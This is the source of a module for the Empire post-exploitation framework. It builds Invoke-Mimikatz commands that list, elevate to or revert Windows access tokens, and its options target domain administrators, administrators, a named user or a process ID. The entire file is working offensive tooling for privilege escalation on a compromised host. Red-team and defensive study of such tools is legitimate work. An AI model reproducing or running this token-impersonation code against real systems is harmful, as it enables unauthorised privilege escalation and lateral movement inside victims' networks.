from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        list_tokens = params["list"]
        elevate = params["elevate"]
        revert = params["revert"]
        admin = params["admin"]
        domainadmin = params["domainadmin"]
        user = params["user"]
        processid = params["id"]

        script_end = "Invoke-Mimikatz -Command "

        if revert.lower() == "true":
            script_end += "'\"token::revert"
        else:
            if list_tokens.lower() == "true":
                script_end += "'\"token::list"
            elif elevate.lower() == "true":
                script_end += "'\"token::elevate"
            else:
                raise ModuleValidationException(
                    "list, elevate, or revert must be specified!"
                )

            if domainadmin.lower() == "true":
                script_end += " /domainadmin"
            elif admin.lower() == "true":
                script_end += " /admin"
            elif user.lower() != "":
                script_end += " /user:" + str(user)
            elif processid.lower() != "":
                script_end += " /id:" + str(processid)

        script_end += "\"';"

        return script, script_end
